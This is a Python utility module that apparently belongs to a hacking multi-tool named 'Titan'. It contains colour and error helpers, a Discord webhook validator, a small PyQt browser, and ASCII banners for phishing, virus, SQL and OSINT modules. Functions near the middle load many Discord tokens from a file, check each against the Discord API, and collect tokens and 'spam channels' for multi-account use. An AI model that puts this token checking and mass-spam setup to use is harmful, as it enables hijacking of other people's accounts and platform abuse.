from .Config import *
from .Translates import *

try:
    import colorama
    import ctypes
    import subprocess
    import os
    import time
    import sys
    import datetime
    import sys
    import requests
    from pathlib import Path
except Exception as e:
    import os
    print(f"[x] | Error Module (Restart Setup.bat): {e}")
    os.system("pause")

color_webhook = 0xa80505
username_webhook = name_tool
avatar_webhook = "https://cdn.discordapp.com/attachments/1271668100856676352/1271668223548457071/b900x900.jpg?ex=66b82cd2&is=66b6db52&hm=b961789f542b64bb6cc581e5549e0eafd91779dcefcd308ba171f7033f798a3f&"

colorama.init()
color = colorama.Fore


primary = color.BLUE
secondary = color.WHITE
valid = color.GREEN
invalid = color.RED
reset = color.RESET
yellow = color.YELLOW


def change_color(role, new_color):
    global primary, secondary, valid, invalid
    if role == 'primary':
        primary = new_color
    elif role == 'secondary':
        secondary = new_color
    elif role == 'valid':
        valid = new_color
    elif role == 'invalid':
        invalid = new_color
    else:
        print("Invalid role name")


available_colors = [
    ("RED", color.RED),
    ("GREEN", color.GREEN),
    ("YELLOW", color.YELLOW),
    ("BLUE", color.BLUE),
    ("WHITE", color.WHITE),
    ("MAGENTA", color.MAGENTA),
    ("CYAN", color.CYAN),
    ("BLACK", color.BLACK),
]

def display_current_colors():
    print(f"{primary}Primary: {primary}blue{reset}")
    print(f"{secondary}Secondary: {secondary}white{reset}")
    print(f"{valid}Valid: {valid}green{reset}")
    print(f"{invalid}Invalid: {invalid}red{reset}")

current_language = LANGUAGE

def tr(key):
    return translations[current_language].get(key, key)

try: username_pc = os.getlogin()
except: username_pc = "username"

def current_time_day_hour():
    return datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')

def current_time_hour():
    return datetime.datetime.now().strftime('%H:%M:%S')

BEFORE = f'{primary}[{secondary}'
AFTER = f'{primary}]'

BEFORE_GREEN = f'{valid}[{secondary}'
AFTER_GREEN = f'{valid}]'

INPUT = f'{BEFORE}>{AFTER} |'
INFO = f'{BEFORE}!{AFTER} |'
ERROR = f'{BEFORE}x{AFTER} |'
ADD = f'{BEFORE}+{AFTER} |'
WAIT = f'{BEFORE}~{AFTER} |'

GEN_VALID = f'{BEFORE_GREEN}+{AFTER_GREEN} |'
GEN_INVALID = f'{BEFORE}x{AFTER} |'

INFO_ADD = f'{secondary}[{primary}+{secondary}]{primary}'

def Censored(text):
    censored = ["HeartWay", website, creator]
    for censored_text in censored:
        if text in censored:
            print(f'{BEFORE + current_time_hour() + AFTER} {ERROR} Unable to find "{secondary}{text}{primary}".')
            Continue()
            Reset()
        elif censored_text in text:
            print(f'{BEFORE + current_time_hour() + AFTER} {ERROR} Unable to find "{secondary}{text}{primary}".')
            Continue()
            Reset()
        else:
            pass

def Title(title):
    if sys.platform.startswith("win"):
        ctypes.windll.kernel32.SetConsoleTitleW(f"{name_tool} {version_tool} | {title}")
    elif sys.platform.startswith("linux"):
        sys.stdout.write(f"\x1b]2;{name_tool} {version_tool} | {title}\x07")
        
def Clear():
    if sys.platform.startswith("win"):
        os.system("cls")
    elif sys.platform.startswith("linux"):
        os.system("clear")

def Reset():
        if sys.platform.startswith("win"):
            file = f'python ./Titan.py'
            subprocess.run(file, shell=True)
        elif sys.platform.startswith("linux"):
            file = f'python3 ./Titan.py'
            subprocess.run(file, shell=True)

def StartProgram(program):
    if sys.platform.startswith("win"):
        file = f'python ./Settings/{program}'
        subprocess.run(file, shell=True)
    elif sys.platform.startswith("linux"):
        file = f'python3 ./Settings/{program}'
        subprocess.run(file, shell=True)

def Slow(texte):
    delai = 0.03
    lignes = texte.split('\n')
    for ligne in lignes:
        print(ligne)
        time.sleep(delai)

def Continue():
    input(f"{BEFORE + current_time_hour() + AFTER} {INFO} {tr('Continue')} -> " + reset)

def Error(e):
    print(f"{BEFORE + current_time_hour() + AFTER} {ERROR} {tr('Error')} {secondary}{e}", reset)
    Continue()
    Reset()

def ErrorChoiceStart():
    print(f"\n{BEFORE + current_time_hour() + AFTER} {ERROR} {tr('ErrorChoiceStart')}", reset)
    time.sleep(1)

def ErrorChoice():
    print(f"{BEFORE + current_time_hour() + AFTER} {ERROR} {tr('ErrorChoice')}", reset)
    time.sleep(2)
    Reset()

def ErrorId():
    print(f"{BEFORE + current_time_hour() + AFTER} {ERROR} {tr('ErrorId')}", reset)
    time.sleep(2)
    Reset()

def ErrorUrl():
    print(f"{BEFORE + current_time_hour() + AFTER} {ERROR} {tr('ErrorUrl')}", reset)
    time.sleep(2)
    Reset()

def ErrorResponse():
    print(f"{BEFORE + current_time_hour() + AFTER} {ERROR} {tr('ErrorResponse')}", reset)
    time.sleep(2)
    Reset()

def ErrorEdge():
    print(f"{BEFORE + current_time_hour() + AFTER} {ERROR} {tr('ErrorEdge')}", reset)
    time.sleep(2)
    Reset()

def ErrorToken():
    print(f"{BEFORE + current_time_hour() + AFTER} {ERROR} {tr('ErrorToken')}", reset)
    time.sleep(2)
    Reset()
    
def ErrorNumber():
    print(f"{BEFORE + current_time_hour() + AFTER} {ERROR} {tr('ErrorNumber')}", reset)
    time.sleep(2)
    Reset()

def ErrorWebhook():
    print(f"{BEFORE + current_time_hour() + AFTER} {ERROR} {tr('ErrorWebhook')}", reset)
    time.sleep(2)
    Reset()

def ErrorCookie():
    print(f"{BEFORE + current_time_hour() + AFTER} {ERROR} {tr('ErrorCookie')}", reset)
    time.sleep(2)
    Reset()

def ErrorUsername():
    print(f"{BEFORE + current_time_hour() + AFTER} {ERROR} {tr('ErrorUsername')}", reset)
    time.sleep(2)
    Reset()

def ErrorModule(e):
    print(f"{BEFORE + current_time_hour() + AFTER} {ERROR} {tr('ErrorModule')} {secondary}{e}", reset)
    Continue()
    Reset()

def OnlyWindows():
    print(f"{BEFORE + current_time_hour() + AFTER} {ERROR} {tr('OnlyWindows')}", reset)
    Continue()
    Reset()

def OnlyLinux():
    print(f"{BEFORE + current_time_hour() + AFTER} {ERROR} {tr('OnlyLinux')}", reset)
    Continue()
    Reset()

def CheckWebhook(webhook):
    if webhook.lower().startswith("https://discord.com/api/webhooks"):
        pass
    elif webhook.lower().startswith("http://discord.com/api/webhooks"):
        pass
    elif webhook.lower().startswith("https://canary.discord.com/api/webhooks"):
        pass
    elif webhook.lower().startswith("http://canary.discord.com/api/webhooks"):
        pass
    elif webhook.lower().startswith("https://discordapp.com/api/webhooks"):
        pass
    elif webhook.lower().startswith("http://discordapp.com/api/webhooks"):
        pass
    else:
        ErrorWebhook()

def ChoiceMultiChannelDiscord():
    try:
        num_channels = int(input(f"{INPUT} How many spam channels -> {reset}"))
    except ValueError:
        ErrorNumber()
    
    selected_channels = [] 
    number = 0
    for _ in range(num_channels):
        try:
            number += 1
            selected_channel_number = input(f"{color.BLUE}{INPUT} Channel Id {number}/{num_channels} -> {color.RESET}")
            selected_channels.append(selected_channel_number)
        except:
            ErrorId()

    return selected_channels


def ChoiceMultiTokenDisord():

    def CheckToken(token_number, token):
        r = requests.get('https://discord.com/api/v8/users/@me', headers={'Authorization': token, 'Content-Type': 'application/json'})
        if r.status_code == 200:
            status = f"Valid"
            user = requests.get(
                'https://discord.com/api/v8/users/@me', headers={'Authorization': token}).json()
            username_discord = user['username']
            token_sensur = token[:-25] + '.' * 3
            print(f"{secondary}[{primary}{token_number}{secondary}]{primary} -> {primary}Status: {secondary}{status}{primary} | User: {secondary}{username_discord}{primary} | Token: {secondary}{token_sensur}")
        else:
            status = f"Invalid"
            print(f"{secondary}[{primary}{token_number}{secondary}]{primary} -> {primary}Status: {secondary}{status}{primary} | {primary}Token: {secondary}{token}")

    file_token_discord = "./2-Input/TokenDisc/TokenDisc.txt"
    tokens = {}
    token_discord_number = 0

    with open(file_token_discord, 'r') as file_token:
        for line in file_token:
            if not line.strip() or line.isspace():
                continue
            token_discord_number += 1
        
        if token_discord_number == 0:
            print(f"{INFO} {tr('NoToken1')} {secondary}{file_token_discord}{primary} {tr('NoToken2')}")
            Continue()
            Reset()
        else:
            print(f"{INFO} {secondary}{token_discord_number}{primary} {tr('TokenFound')} ({secondary}{file_token_discord}{primary})")
    
    try:
        num_tokens = int(input(f"{INPUT} How many token (max {token_discord_number}) -> {reset}"))
        if num_tokens > token_discord_number:
            ErrorNumber()
    except:
        ErrorNumber()

    token_discord_number = 0
    with open(file_token_discord, 'r') as file_token:
        print()
        print(f"{primary}Token Discord ({secondary}{file_token_discord}{primary}):")
        for line in file_token:
            if not line.strip() or line.isspace():
                continue
            
            token_discord_number += 1
            modified_token = line.strip()
            tokens[token_discord_number] = modified_token
            CheckToken(token_discord_number, modified_token)

    number = 0
    selected_tokens = []
    print()
    for _ in range(num_tokens):
        try:
            number += 1
            selected_token_number = int(input(f"{color.BLUE}{INPUT} {tr('TokenNumber')} {number}/{num_tokens} -> {color.RESET}"))
        except:
            ErrorNumber()
        
        selected_token = tokens.get(selected_token_number)
        if selected_token:
            selected_tokens.append(selected_token)
        else:
            ErrorNumber()
    return selected_tokens


def Choice1TokenDiscord():
    def CheckToken(token_number, token):
        r = requests.get('https://discord.com/api/v8/users/@me', headers={'Authorization': token, 'Content-Type': 'application/json'})
        if r.status_code == 200:
            status = f"Valid"
            user = requests.get(
                'https://discord.com/api/v8/users/@me', headers={'Authorization': token}).json()
            username_discord = user['username']
            token_sensur = token[:-25] + '.' * 3
            print(f"{secondary}[{primary}{token_number}{secondary}]{primary} -> {primary}Status: {secondary}{status}{primary} | {tr('User')}: {secondary}{username_discord}{primary} | Token: {secondary}{token_sensur}")
        else:
            status = f"Invalid"
            print(f"{secondary}[{primary}{token_number}{secondary}]{primary} -> {primary}Status: {secondary}{status}{primary} | {primary}Token: {secondary}{token}")

    file_token_discord = "./2-Input/TokenDisc/TokenDisc.txt"
    tokens = {}
    token_discord_number = 0

    with open(file_token_discord, 'r') as file_token:
        print(f"{primary}Token Discord ({secondary}{file_token_discord}{primary}):")
        for line in file_token:
            if not line.strip() or line.isspace():
                continue
    
            token_discord_number += 1
            modified_token = line.strip()
            tokens[token_discord_number] = modified_token
            CheckToken(token_discord_number, modified_token)

    if not tokens:
        print(f"{INFO} {tr('NoToken2')} {secondary}{file_token_discord}{primary} {tr('NoToken2')}")
        Continue()
        Reset()
        return None

    try:
        selected_token_number = int(input(f"\n{color.BLUE}{INPUT} {tr('TokenNumber')} -> {color.RESET}"))
    except:
        ErrorChoice()

    selected_token = tokens.get(selected_token_number)
    if selected_token:
        r = requests.get('https://discord.com/api/v8/users/@me', headers={'Authorization': selected_token, 'Content-Type': 'application/json'})
        if r.status_code == 200:
            pass
        else:
            ErrorToken()
    else:
        ErrorChoice()
    return selected_token


def BrowserPrivate(site, search_bar=True, title="Navigateur Web"):
    try:
        from PyQt5.QtWidgets import QApplication, QMainWindow, QLineEdit, QVBoxLayout, QWidget
        from PyQt5.QtGui import QIcon
        from PyQt5.QtCore import QUrl, Qt
        from PyQt5.QtWebEngineWidgets import QWebEngineView
    except Exception as e:
        ErrorModule(e)

    class WebBrowserApp(QMainWindow):
        def __init__(self, url=None, width=1000, height=300, search_bar=True, title="Navigateur Web"):
            super().__init__()
            self.setWindowTitle(title)

            self.search_bar = search_bar
            self.url_entry = QLineEdit()
            self.url_entry.returnPressed.connect(self.load_url)
            self.url_entry.setText(url or "") 
            self.url_entry.setVisible(self.search_bar)

            self.webview = QWebEngineView()

            layout = QVBoxLayout()
            if self.search_bar:
                layout.addWidget(self.url_entry)
            layout.addWidget(self.webview)

            central_widget = QWidget()
            central_widget.setLayout(layout)
            self.setCentralWidget(central_widget)

            if url:
                self.load_url()
            logo = "./Img/Titan_Icon.ico"
            self.setWindowIcon(QIcon(logo))

            self.setWindowFlags(Qt.Window | Qt.CustomizeWindowHint | Qt.WindowMinMaxButtonsHint | Qt.WindowCloseButtonHint)

        def toggle_search_bar(self, visible):
            self.url_entry.setVisible(visible)

        def load_url(self):
            url = self.url_entry.text()
            if url:
                self.webview.load(QUrl(url))

        def contextMenuEvent(self, event):
            pass 

    def main():
        app = QApplication(sys.argv)
        app.setStyleSheet("""
            QMainWindow {
                background-color: #1c1c1c;
                color: #ffffff;
            }
            QLineEdit {
                background-color: #333333;
                color: #ffffff;
                border: 1px solid #555555;
                padding: 5px;
            }
            QWebEngineView {
                background-color: #1c1c1c;
                color: #ffffff;
                border: none;
            }
        """)
        browser = WebBrowserApp(url=site, width=500, height=10, search_bar=search_bar, title=f"{name_tool} {version_tool} | {title}")
        browser.show()
        sys.exit(app.exec_())

    main()

url_banner = primary + r"""

                   .-+*#%##+-.                                                           
               .=%@@@@=-%=:#@@@@*..                                                      
             :*@*:#@:..-%=...#@--%%-.                                                    
           .+@+.:%#.. .-%=   .=@=.-%#:.                                                  
          .%#=#@@%-....-%=....:+@@%+*@-.......................................             
         .%#. .=%**%%@@@@@@@%%#+%*. .+@@%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%*:..          
         *@.. .*#:.... -%=......=%-  .#@....                                  '=%#.          
        .@*.  :#+.     -%=.    .-@+   :@-    __      ____      ____      __     '##.         
        :@#****@#******#@#******#@%****@*.   \ \ /\ / /\ \ /\ / /\ \ /\ / /      =@:         
        :@+:::=%+::::::=%+::::::=@*::::@+.    \ V  V /  \ V  V /  \ V  V /       =@:         
        .%#.  :#*..    -%=     .-@=...-@.      \_/\_/    \_/\_/    \_/\_/      .+@:         
         -@-. .*%:..:-=*%*==-:..+#:  .%#.                                    .=%#*   
         .+@-..+@%%#+==+%*==+*%%@#:..#%%######################################*'  
          .=@%%+*%-.   -%=    .#%=#%@*..                            
           .:#%-.+%-   -%=   .%%.:*%=.                            
             .:#%#+@#:.-%= .+@#+%%=.                                  
              ...:+@@@@%@%%@@@#-....                                     
                   ...........                                                 

"""

phishing_banner = primary + r"""
⠀⠀⠀⠀	⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀					⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡇⠀⠀
⠀⠀					 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡇⠀⠀
					⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡇⠀⠀
⠀					⠀⠀⠀⠀ ⠀⠀⠀⠀⠀⠐⣶⣶⣦⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡇⠀⠀
					⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⡿⠿⠆⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡇⠀⠀
⠀					⠀⠀⠀⠀ ⠀⠀⠀⠀⠀⠀⠘⢉⣡⣤⣶⣶⣶⣶⣶⣶⣶⣶⣤⠀⠀⢸⣇⠀⠀
					⠀⠙⣿⣷⣦⡀⠀⠀⠀⣀⣴⣾⣿⣿⣿⣿⣿⣿⣿⠋⠉⣿⠟⠁⠀⠀⢸⡟⠀⠀
					 ⠀⠀⢸⣿⡿⠋⢀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⠖⠁⠀⠀⣷⡄⢸⡇⠀⠀
				         ⠀⠀⠀⣿⠁⢴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡀⠀⠀⠀⢿⣀⣸⡇⠀⠀
					 ⠀⠀⠀⣿⣷⣤⣈⠛⠻⢿⣿⡿⢁⣼⣿⣿⡿⠛⣿⣿⣿⣦⣄⡀⠈⠉⠉⠁⠀⠀
					  ⠀⠀⢀⣿⡿⠟⠁⠀⠀⠀⠀⠀⠛⠉⠉⠠⠤⠾⠿⠿⠿⠿⠟⠛⠋⠁⠀⠀⠀⠀
					  ⠀⠀⠈⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
                                                     ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀"""

decrypted_banner = primary + r"""

                       ..:=+****+=:.                        
                     .-#*-:.    .:-#*-.                     
                    .%+.   .:::..   .+%..                   
                  .-#: .:+#+-::-+#+.. :#-.                  
                  :#- .=#:       .:%=. -#.                  
                  -+..=#.          .%-..*-  .=*.            
                  -= .==.           ==..+- -#=.             
                  -= .==.           :#*#*: ..:+*=.          
                  -= .==.                   ...             
               .-#%%%%%%%%%%%%%%%%%%%%%%%%#-.*%%%-.         
               :#.                        .#:.              
               :#.                        .#:               
               :#.         ..::.          .#:               
               :#.        .=%==%=.        .#:               
               :#.        .#.  .#.        .#:               
               :#.         -% .%:         .#:               
               .*:        .** .#*.        :*.               
               .+#        :#....#.       .%=                
                .#*.      ..::::..     ..**.                
                 .+*:                  .*+.                 
                  .:#*.             ..*%:.                  
                    .:*#=:........:=#*:                     
                      ..:-++****+=-...                      
                                                            
"""


encrypted_banner = primary + r"""
                                                       j@@@@@^                                 
                           _@v   p@@@@j           j@@@@@@@@@@@@@@@;          |@@@@M   v@}      
                          @@@@@} >@@@@    v@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@p    @@@@_ _@@@@@     
                          >@@@v    @@     v@@@@@@@@@@@@      p@@@@@@@@@@@a     @@    j@@@_     
                           ^@@     @@@@   |@@@@@@@@@@^ @@@@@@; @@@@@@@@@@p   p@@@     M@;      
                           ^@@            >@@@@@@@@@@ p@@@@@@@ M@@@@@@@@@j            M@;      
                           ^@@@@@@@@@@@}   @@@@@@@@|            >@@@@@@@@;   @@@@@@@@@@@;      
                                           }@@@@@@@|    O@@@    >@@@@@@@M                      
                          |@@@@             @@@@@@@|     M@     >@@@@@@@^            @@@@j     
                          @@@@@@@@@@@@@@@>   @@@@@@|    O@@@    >@@@@@@    @@@@@@@@@@@@@@@     
                            ^                 @@@@@v            }@@@@@^                ^       
                                 p@@@@@@@@@^   M@@@@@@@@@@@@@@@@@@@@@    @@@@@@@@@p            
                                 p@_            ^@@@@@@@@@@@@@@@@@@>            >@a            
                                @@@@O              @@@@@@@@@@@@@@              J@@@@           
                               ;@@@@@                 J@@@@@@p                 @@@@@>          
                                  ;              p@              p@>  M@@_       ;             
                                          @@@@p  p@_  ;      j_  a@@@@@@@@j                    
                                         ^@@@@@@@@@   v@_   O@}       M@@_                     
                                            ;         p@|   O@}      }}                        
                                                    >@@@@@  O@@@@@@@@@@@J                      
                                                     p@@@j         ;@@@@^                      """



scan_banner = primary + r"""
   
                                           .:.                                           
                                           .+.                                           
                            -:             .+.              .-.                          
                             -+.           .+.            .-*:                           
                              .=+.         .+.           -*:                             
                                .=.                    .=-                               
                                   :-+*##*++=+*#**=-.                                    
                             .:=*+-:=*-.         .+*-=*+-..                              
                          .+*-:. .++.              .-*...:+*-.                           
                      .:+*:.    .*:        .:-++***+=-#-.   .=*-..                       
                    .++:.       +-      .-*=::=*****=::+*:     .=*-.                     
                 .:*=.         -+.    .-*:-*=.      ..+*-:*:      :*=.                   
                :*-.           *-     +-:+:            .*#-++.      .==.                 
                :*:.           *-   .*-=+. +=:::::::::::*.+-=+.     .-+.                 
                 .-*-.         ==   -+-+.  =-          :+ .*.+:   .++:.                  
                    :*=..      .+: .*:=:   =-          =-  ==-=.-*=.                     
                      .-*=.     :*..*.+:   -=        .+=.  -+-#+:.                       
                         .-*+:.. .*=+-=-   -=.      :*: ..-#-=-                          
                            ..-+*=.:*#:*.  :=.   .-*--+*=:-+.+:                          
                                  .-+*+:#+==*=+*##*=:.   :+:*-                           
                                      -+.=+....        .+-:*:                            
                                       .++:=*=:....::=*-:*+...                           
                                        ..-*+-:::::::-*+:.+#-*:                          
                                             .:-===-..    *: .=*:.                       
                                                          .=*. .=*.                      
                                                            .=+. .++.                    
                                                              .+=...*+.                  
                                                                :*=*-:+.                 
                                                                  :**=..                 

"""



sql_banner = primary + r"""
                                                                                   ^                      
                                                                                 J@@M                     
                                                                        ^         @@@@^                   
                                                                     ;@@@>         J@@@                   
                                                                      ;@@@J      ;j j@@@}                 
                                                                       ^@@@O  ^J@@@@^;@@@}                
                                                                   >@@@; @@@@^;@@@@@> ;@@@O               
                                                                >j _@@@@j p@@@^;@|      @@@>              
           _____       _                                      }@@@@  @@@@j J@@@>                          
          / ____|     | |                                 ^a@@ _@@@@;_@@@@a }@@@>                         
         | (___   __ _| |                              ^} v@@@@^;@@@@@@@@@@@ >@@@v                        
          \___ \ / _` | |                            |@@@@ ^@@@@J@@@@@@@@@@@@;^@@@J                       
          ____) | (_| | |                         J@M }@@@@ _@@@@@@@@@@@@@@j    @@j                       
         |_____/ \__, |_|                      ; v@@@@ >@@@@@@@@@@@@@@@@j                                 
                    | |                     ^@@@@ ;@@@@v@@@@@@@@@@@@@j^                                   
                    |_|                     a@@@@@ >@@@@@@@@@@@@@@a                                       
                                            |@@@@@@@@@@@@@@@@@@J                                          
                                          |a ;@@@@@@@@@@@@@@a;                                            
                                         @@@@ ;@@@@@@@@@@@;                                               
                                        |@@@@@> @@@@@@@>                                                  
                                     }@@@pO@MJ   >pp_                                                     
                                  ;@@@a                                                                   
                               ;@@@p;                                                                     
                            >p@@M>                                                                        
                           }@@>                                                                          
"""



map_banner = primary + r"""
                     ..      ....::-:. ....                                                               
    .........     ....:::-...*%+@@@@*+*==%@#+...                      ......     ....................     
   ...*#@@@+:.   ..++-+*=-+:-+*%*-*#@@@@@@@@@#-.                   ....+%%%-..:-...*##**%+*#%@@@@%%=.     
   .*%@@@@@@@%*#*-:+@@#*=+*+=+=...=#@@@@@@@@#:                     ..*@@@@@@@@@@@@@@@@@@@@@@@@@@@+...     
 ..+%@@@@@@@@@@@@@@+*+*==#:%@@%:...-@@@@@@@%+.        ..       ..:#*#@@@@@@@@@@@@@@@@@@@@@@@@@@@@#:       
 .-@@@@%@@@@@@@@@@@@@@@@@@+*:=@%-..-@@@@@@%=..      ..=**-....--+#%@@@@@@@@@@@@@@@@@@@@@@@@@%:+*-..       
 .-+:....-@@@@@@@@@@@@@%-==::#@+..:%@@%+..:+=:    ..*@@@@@+:@@@@@@@@@@@@@@@@@@@@@@@@@@@@@*:...#@:.        
 ....    .:@@@@@@@@@@@=....#@*::...+@*.  .........:#@@+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%.....=@-.        
         ..%@@@@@@@@@@@@*:=@@@@+.. ....       .=:.:+%%:=%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%:...:..        
          .*@@@@@@@@@@@@@#@@@@@@#.          ..%*#.:*#*@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@=.             
         .:%@@@@@@@@@@@@@@@@@#:-*.            .:*%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#:+=.           
         .+@@@@@@@@@@@@@@@@+...             ..++%@#+%-%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#@@...+-.           
         ..#@@@@@@@@@@@@@-..                ..%@#..:.:-*:#%@@@@@@@@@@@@@@@@@@@@@@@@@@@@:-*:+#-.           
          ..+%@@@@@%%#@+..                  .:*%@@@@+:.-...:@@@@@@@@@@@@@@@@@@@@@@@@@@@*......            
            .**@@#. ..:=.                  .=@@@@@@@@@@@@@@-=@@@#-+#@@@@@@@@@@@@@@@@@@@=..                
             .:*@%=+#..:+-:...           ..*@@@@@@@@@@@@@@@@*=@@@@@#:..-%@@@#:=@@@@*=.....                
               ....-+%:.......           ..%@@@@@@@@@@@@@@@@@#:%+-..    .@%-. .:-@@@=..:=:..              
                    ..-=@@@@@%-:..       ...+@@@@@@@@@@@@@@@@@@@@-.     ..=-. ..:=.....:.#:.              
                     .:@@@@@@@@@*-.....    ........=@@@@@@@@@@@*:.       ...  ..:**.-#@+-::..........     
                     .=@@@@@@@@@@@@@@+.           ..#@@@@@@@@*...               ..-+..::=...:+@@+:=..     
                       :%@@@@@@@@@@@#..             .@@@@@@@@*..:..                 ...:.:.:-:::.-.       
                       ..:@@@@@@@@@@:             ..*@@@@@@@%-.%#:.                   ..=%@@@#*@:.        
                        ..%@@@@@@@:..               .%@@@@@@...%:.                  .+@@@@@@@@@@@+.       
                        ..@@@@@@%:                  .:%@@@#. ...                    .*@@@@@@@@@@@%:       
                        ..@@@@@=..                   .:-:...                        .*%*=::*@@@@@+.    ...
                        ..%@@+...                                                   ..    ..:%%%:..  ..-+.
                        ..+@%..                                                             .:+.. ..:+=:..
                          .@+..-.                                                           ....  .-:..   
                          ..:-.                                                                           
                                                                                                          
                                ..:..                        ....    .................                    
                          ..  ..:*@=.         ....::::...:--+*%@%*+=-+#%%%@@@%@%%%@@%#*=-...              
               ....-+**+**+@%%%%@@@@=...   .:+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%+-..              
               ..-+*#####################################################################*:.                                          
"""



virus_banner = primary + r"""
                                                                                       
                                                                                       
                                                                                       
                                                                                       
                                    ..:-==+====-:..                                    
                               .-**=----:.....::--:-+*+:.                              
                           .:+*+=:....   .  .....  ...-+*+:.                           
                         .-*+-::.                     .::-+*:.                         
                       .:++:::.                         .:::*+:.                       
                      .=*:--                               -:-#=.                      
                     .++:=:-                                   ++:                     
                    :+--: .-.                                   =*:                    
                   :+:=*.::..                                  . =*:                   
                  .===#*-*-.                                   :. +=.                  
                 .:#:#%#:=+:.                                 .:. .*-.                 
                 .-+.=@%+-#=-.                                =:.  +=.                 
                 .+-.-#@#.=#+=.                              .-:   -+:                 
                 :*-.-*@%=-%#*=...  ...        ...:....      ==:   :*:                 
                 .=*.-#@@*.+%*-... .-+=:.    ..--...        .**:.  *+.                 
                 .-%.:*@@#.    ....:        ::       ..::..  **-. :%-.                 
                  .++.-#%- .:+%@@@@@@#=::====..:+%@@@@@%#-.  +*-. ++:                  
                   :*..=#=#@@@@@@@@@@@@@@%=--+##@@@@@@@@@@@@#+=: .*:                   
                   .-#.+#-=@@@@@@@@@@@@@%%+.-+-*@@@@@@@@@@@@=:=:.#-.                   
                    :#+***=@@@@@@@@@@@@%**-.-+-+@@@@@@@@@@@@=:.=+%-.                   
                    .*+-**-%@@%@@@@@@%+:-*%#@+.:=#%@@@@@@@@@==::+*:                    
                    .-+.:*+=#%%%%*-..-+=+%@@@#+*=:.:*%%%%%+:+-. ++.                    
                   .-#. .:+*---: ....:+++@@@@@+.:+*+:..-:.-:.....#-.                   
                   .==  .-..     .:+-:*%@@@@@@#+-.-:.   .-=:....-=+:                   
                    .-#::::     .:.. .:=%@@@@@%-.   ..     =:   *=.                    
                     .-#*+#*****=::   .:=%%%@@*:.   ..=**##%*=-+-.                     
                       .=@@@@@%-+#:......-=:-+:.   .:**=#@@@@@=.                       
                        :*%*#%#:-*: :=:-.-=-::.     =%=.*%**%+.                        
                         :=-.-#*-*+---::::...:::-::-+*-+*-.+=.                         
                         .-=..-%#=-+#**#****+##****+-:+%=:.+-.                         
                         .=+.:--#*+#*=:::- . --..=***-+=+: +-.                         
                         .=+....-+=-.-+=**+*++**=:.-=+-=-. +-.                         
                         :++. ...::-=+=--...::----=----:.  -=.                         
                         .=%*: ..  ...==:--:--:=-.   ..  .=+:.                         
                           :+#-.  ..  .:-=+*+=-.     .:::+=.                           
                            ..-++=::-..    .    ..:..=*+-.                             
                                .-*+:.:-:  .......:=*=.                                
                                   :**-:::::::..:+*:                                   
                                     .:==-:--=+*-.                                     
                                                           
"""



logo_banner = primary + r"""
                                                                                                                                                                                                                       
                                  ......             
                        ..:----:=++=--=++=.                  
                      .=+===+##=:=*%%%%*-:+.               
                     :*:+#+.:-+#%%%%%%%%%+-=.          
                     -+:%%*#%%%%%%%%%%%%%%++:               
                     -=-%%%%%%%%%%%%%%%%%%#+:     
                     ===%%%%%%%%%%%%%%%%%*+======+=:.   
                  .=*%-+%%%%%%%%%%%%#=::-=+****++---==:.                           
               .:+=*%%:+%%%%%%%%%#=-+#%%%%%%%%%%%%%%#*++:                      
              :*--#%%%.+##%%%%%*-+#%%%%%%%%%%%%%%%%%%%%%%:                 
            .+=.=%%%%#.       .*%%%%%%%#+=-::..::::::-+*-.              
            *: =%%%%%%+-:....+%%%%#=:...-+###*+=-::::...                
           :+..%%%%%%%%%%#:-#%%+:.:+*+-.........-*%%%*-.               
           .*..%%%%%%%%%=:*%*-=#+-...             .:#@@%:               
            .*-.*%%%%%+=#%##+:..         ..:=#%%*: .+@@@=               
              .*%%%##%%#=.                     =@%*-%@@+.             
            .=%%+. ..=#%=.  .            .-%*:.#@@@%%**:               
           :#@@+  :*%#. ..=+-....:=++**- .:*@%%@%%+-#%-.             
           -%@@%-:*@#: .+#-  =%%@%%%%#+:=#%%%*=:=#%#=...            
            .=#%%%%@@@#+*@%*=----=++##*+=-:=*##*=:.-*#-.              
                  :+%%*++=-----:----=+**+=-:.:-+#%%*=.             
                     :+%%%%%##**++++++**#%%%##*=:.:+*:                
                       :*%%*+=-====----::.:::-=*%%#=.                    
                         ..-=**#########***+=--:.            
                              :+*+==-----=+*#*=.          
                               .-==++*****+=-.                
                                :+#%%%%@@%*-.           
                                -*+++**#*-.           
                                 .-=++=-.                    
                                -###%+.                  
                                 .=#+.                    
                                   ..                      
                                                                                                                                            
"""



osint_banner = primary + r"""
                             ....                                          
                       :=-:--======++=.                                    
                    :=:-=---::::::--=***+.                                 
                  :=---::...........::-=*#*:                               
